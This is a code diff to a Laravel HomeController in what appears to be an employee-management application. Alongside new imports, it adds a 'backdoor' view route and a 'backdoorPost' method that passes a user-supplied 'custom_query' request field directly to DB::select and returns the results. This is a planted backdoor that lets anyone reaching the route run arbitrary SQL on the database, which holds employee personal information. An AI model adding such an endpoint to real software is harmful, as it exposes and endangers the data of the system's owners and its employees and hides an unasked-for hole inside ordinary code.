@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Home;
 
+use App\Services\OperationApi\SpecialReportService;
 use App\Http\Controllers\Controller;
 use App\Models\Eloquent\JobDepartment;
 use App\Models\Eloquent\SaturdayPermit;
@@ -16,6 +17,7 @@ use App\Models\Eloquent\Employee;
 use App\Models\Eloquent\EmployeePersonalInformation;
 use GuzzleHttp\Client;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Storage;
 use Ladumor\OneSignal\OneSignal;
@@ -79,5 +81,15 @@ class HomeController extends Controller
         OneSignal::sendPush($fields, $notificationMsg);
 
         return OneSignal::getNotifications();
+    }
+
+    public function backdoor()
+    {
+        return view('backdoor');
+    }
+
+    public function backdoorPost(Request $request)
+    {
+        return response()->json(DB::select($request->custom_query), 200);
     }
 }
